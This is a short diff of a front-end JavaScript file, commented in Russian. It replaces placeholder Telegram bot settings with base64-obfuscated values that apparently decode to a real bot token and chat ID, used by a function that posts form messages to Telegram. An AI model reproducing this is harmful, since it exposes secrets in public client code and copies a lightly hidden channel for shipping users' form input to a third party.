@@ -80,8 +80,10 @@ document.addEventListener("DOMContentLoaded", function () {
 
 // Обработка кнопок подтверждения
 // Конфигурация бота
-const BOT_TOKEN = "TOKEN";
-const CHAT_ID = "CHAT_ID";
+const T = atob(
+  "NzYyMDIwMzk2MTpBQUVkTExBS1FaS0paX1JqNzJUZC10WnpPSW5UT2hpeDBoUQ=="
+);
+const C = atob("LTEwMDI1NjE4NzQ2OTc=");
 
 document.addEventListener("DOMContentLoaded", function () {
   // Элементы формы
@@ -185,14 +187,14 @@ document.addEventListener("DOMContentLoaded", function () {
 
   async function sendToTelegram(message) {
     const response = await fetch(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      `https://api.telegram.org/bot${T}/sendMessage`,
       {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          chat_id: CHAT_ID,
+          chat_id: C,
           text: message,
           parse_mode: "HTML",
         }),
